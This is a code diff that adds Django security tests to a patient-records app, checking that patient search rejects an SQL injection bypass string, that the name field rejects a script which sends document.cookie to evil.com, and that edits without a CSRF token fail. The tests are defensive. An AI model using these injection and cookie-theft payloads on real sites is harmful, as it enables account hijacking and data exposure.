@@ -163,6 +163,18 @@ class Tugas3GeneralSecurityTestCases(TestCase):
 
         self.assertEqual(findings, [])
 
+    def test_tc_sqli_04a_hospital_medical_record_search_rejects_bypass_payload(self):
+        self.client.force_login(self.patient_user)
+
+        response = self.client.get(
+            reverse("core_app:patient_encounters"),
+            {"q": "12345' OR '1'='1"},
+        )
+
+        self.assertEqual(response.status_code, 200)
+        self.assertContains(response, "No encounter history found.")
+        self.assertNotContains(response, f"Encounter #{self.encounter.encounterNumber}")
+
     def test_tc_ci_01_script_tag_input_is_rejected(self):
         self.client.force_login(self.patient_user)
         payload = "<script>alert('XSS')</script>"
@@ -214,6 +226,25 @@ class Tugas3GeneralSecurityTestCases(TestCase):
         self.assertFalse(Appointment.objects.filter(reason=payload).exists())
         self.assertContains(response, "Keluhan hanya boleh")
         self.assertNotContains(response, settings.SECRET_KEY)
+
+    def test_tc_ci_04a_patient_name_rejects_cookie_stealing_script_payload(self):
+        self.client.force_login(self.patient_user)
+        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+        response = self.client.post(
+            reverse("core_app:patient_edit", args=[self.patient.id]),
+            {
+                "name": payload,
+                "dateOfBirth": "1999-01-01",
+                "address": "Jl. Test 1",
+                "phoneNumber": "08123456789",
+            },
+        )
+
+        self.assertEqual(response.status_code, 200)
+        self.assertContains(response, "Nama hanya boleh")
+        self.patient.refresh_from_db()
+        self.assertEqual(self.patient.name, "General Patient")
 
     def test_tc_ba_01_password_is_hashed(self):
         user = UserAccount.objects.create_user(
@@ -345,3 +376,23 @@ class Tugas3GeneralSecurityTestCases(TestCase):
         self.assertTemplateUsed(response, "auth_app/forbidden.html")
         self.assertContains(response, "Forbidden Request", status_code=403)
         self.assertFalse(Appointment.objects.filter(reason="CSRF attack attempt").exists())
+
+    def test_tc_csrf_04a_patient_edit_without_token_is_rejected(self):
+        csrf_client = Client(enforce_csrf_checks=True)
+        csrf_client.force_login(self.patient_user)
+
+        response = csrf_client.post(
+            reverse("core_app:patient_edit", args=[self.patient.id]),
+            {
+                "name": "Changed Without CSRF",
+                "dateOfBirth": "1999-01-01",
+                "address": "Jl. Attack 1",
+                "phoneNumber": "08123456789",
+            },
+        )
+
+        self.assertEqual(response.status_code, 403)
+        self.assertTemplateUsed(response, "auth_app/forbidden.html")
+        self.assertContains(response, "Forbidden Request", status_code=403)
+        self.patient.refresh_from_db()
+        self.assertEqual(self.patient.name, "General Patient")
